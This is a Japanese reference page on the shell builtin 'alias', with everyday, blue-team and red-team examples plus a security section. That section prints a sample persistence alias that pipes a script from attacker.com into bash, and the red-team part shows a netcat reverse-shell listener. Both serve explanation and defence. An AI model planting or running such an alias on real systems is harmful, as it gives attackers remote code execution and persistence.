# `alias` - コマンドに別名を定義する

## 概要

`alias` は、シェルの組み込みコマンドです。頻繁に使用する長いコマンドや、特定のオプションを付けたコマンドに対して、短い別名（エイリアス）を定義するために使用します。これにより、コマンド入力の手間を大幅に削減し、タイプミスを防ぎ、作業効率を向上させることができます。定義したエイリアスは、主にインタラクティブなシェルセッションで利用されます。

(出自: `bash`, `zsh` などのシェルの組み込み機能)

## 類似コマンドと差異

| 類似コマンド | 差異 / 使い分けのポイント | 推奨 |
| :--- | :--- | :--- |
| **シェル関数 (`function`)** | `alias` は単純な文字列置換です。引数を取ったり、条件分岐などの複雑なロジックは含められません。シェル関数は引数の処理やロジックを記述できます。 | `alias` (単純な短縮) |
| **スクリプトファイル** | `alias` はシェル起動時にメモリに読み込まれ、対話的セッションで使います。スクリプトは独立したファイルで、再利用性の高い定型処理に適しています。 | - |

## よく連携されるコマンド

`alias`で定義したコマンドは他のコマンドと日常的に連携されます。また、設定ファイルを即座に反映させるために`source`コマンドと連携します。

### シナリオ例: エイリアス化したコマンド出力の絞り込み (ブルーチーム視点)

* **目的**: 定義済みのエイリアス (`ll` など) の実行結果を `grep` でさらに絞り込み、特定のファイルやディレクトリを素早く見つけ出す。
* **連携コマンド**: `grep`
* **解説**: `alias ll='ls -lha'` のように定義しておけば、`ll` の実行結果（詳細なファイルリスト）をパイプで `grep` に渡すことで、目的の情報を効率的にフィルタリングできます。
* **コマンド例**:

    ```bash
    # 'nginx' という文字列を含むファイルやディレクトリだけを表示
    ll | grep 'nginx'
    ```

## オプション説明

| オプション | 説明 |
| :--- | :--- |
| **基本操作** | |
| ⭐ (引数なし) | 現在定義されている全てのエイリアスの一覧を表示します。 |
| `-p` | 現在定義されている全てのエイリアスを、再利用可能な形式 (`alias name='value'`) で出力します。 |

## よく使われるオプション組み合わせと業務シナリオ

### 1. インフラ構築・運用視点

* **タスク**: 日常的なコマンド操作の効率化と、ヒューマンエラーの防止。
* **組み合わせ**: `alias <name>='<command>'`
* **解説**: 危険なコマンドに確認プロンプトを挟んだり、SSH接続やDockerコンテナ操作を短縮したりする、基本的な使い方です。
* **例**:

    ```bash
    # 誤った削除を防ぐため、常に確認を求める
    alias rm='rm -i'
    alias mv='mv -i'

    # よく使うコマンドを短縮
    alias ll='ls -lha'
    alias update='sudo apt update && sudo apt upgrade -y'

    # SSH接続を簡略化
    alias ssh-web='ssh user@web.example.com -i ~/.ssh/id_rsa_web'
    ```

### 2. ブルーチーム視点

* **タスク**: ログ分析や監視など、定型的な調査コマンドを迅速化する。
* **組み合わせ**: `alias <name>='<log_analysis_command>'`
* **解説**: インシデントレスポンスの初動調査で多用するコマンドをエイリアス化し、即座に実行できるようにします。
* **例**:

    ```bash
    # SSHのログイン失敗ログを素早く確認
    alias ssh-fail="grep 'Failed password' /var/log/auth.log | tail -n 20"

    # LISTEN状態のポートをプロセス情報付きで確認 (ssが推奨)
    alias listening='sudo ss -tulpn'
    ```

### 3. レッドチーム視点

* **タスク**: ペネトレーションテストで頻用するコマンドやペイロードを高速にセットアップする。
* **組み合わせ**: `alias <name>='<attack_command>'`
* **解説**: リバースシェルの確立、Webサーバの簡易的な起動、よく使うスキャンコマンドなどを即座に実行できるように準備します。
* **例**:

    ```bash
    # Pythonを使った簡易HTTPサーバをカレントディレクトリで起動
    alias http-server='python3 -m http.server 8000'

    # Netcatでリバースシェルを待ち受ける
    alias nc-listen='nc -lvnp 4444'
    ```

## エラーメッセージとトラブルシューティング

* 一般的なエラーは [Linux共通のトラブルシューティング](./troubleshooting_common_errors.md) を参照。

1. **エラーメッセージ例 1**: `bash: ll: command not found`
    * **考えられる原因**:
        * `ll` というエイリアスが定義されていない。
        * `.bashrc` などに定義を記述したが、`source` コマンドで再読み込みしていない、またはシェルを再起動していない。
        * シェルスクリプト内ではデフォルトでエイリアスは展開されません。
    * **解決策**:
        * `alias` コマンドで定義を確認します。
        * `source ~/.bashrc` を実行します。
        * スクリプト内で使いたい場合は、冒頭で `shopt -s expand_aliases` を宣言します。

## 環境変数と設定ファイル

* 一般的な環境変数・設定ファイルは [Linux共通の環境変数・設定ファイル](./environment_and_config.md) を参照。

### 関連する設定ファイル

* **`~/.bashrc`**: (最も一般的) インタラクティブなシェルが起動するたびに読み込まれます。`alias` の定義は通常ここに記述します。
* **`~/.zshrc`**: Zshを使用している場合の設定ファイル。
* **`~/.profile`, `~/.bash_profile`**: ログインシェルが起動する際に一度だけ読み込まれます。

## セキュリティに関する考慮事項

### 脆弱性と悪用事例

* **脆弱性**: `alias` 自体はシェルの機能であり、直接的なCVEを持つことはほとんどありません。リスクは設定方法に起因します。
* **悪用シナリオ**: **コマンドハイジャック**。攻撃者が侵入後、`.bashrc` に `ls` のような基本的なコマンドを上書きする悪意のあるエイリアスを仕込みます。（例: `alias ls='curl http://attacker.com/evil.sh | bash; /bin/ls'`）管理者が `ls` を実行すると、本来の機能に加え、悪意のあるスクリプトが実行されてしまいます。

### GTFOBins / LOLBAS における利用例

`alias` は独立したバイナリではないため、GTFOBinsやLOLBASには直接リストされていません。しかし、リストされているコマンドを使った悪意のあるワンライナーをエイリアスとして登録し、**永続化**や**隠蔽**の補助的な役割として悪用される可能性があります。

### 対応策・緩和策 (ブルーチーム視点)

* **Prevention (予防)**: `.bashrc` などの設定ファイルのパーミッションを厳格に管理します。重要なスクリプト内では `/bin/ls` のようにコマンドをフルパスで指定し、エイリアスが実行されるのを防ぎます。
* **Detection (検知)**: ファイル整合性監視(FIM)ツールで、シェルの設定ファイルの変更を監視します。システムにログインした際、`alias` コマンドを実行して意図しないエイリアスが登録されていないか確認する習慣も有効です。

## 注意点・補足

* **一時的な無効化**: エイリアスを無視して元のコマンドを実行したい場合は、コマンドの前にバックスラッシュ `\` を付けます (`\rm file.txt`)。
* **`sudo` とエイリアス**: `sudo ll` のように実行しても、通常エイリアスは展開されません。
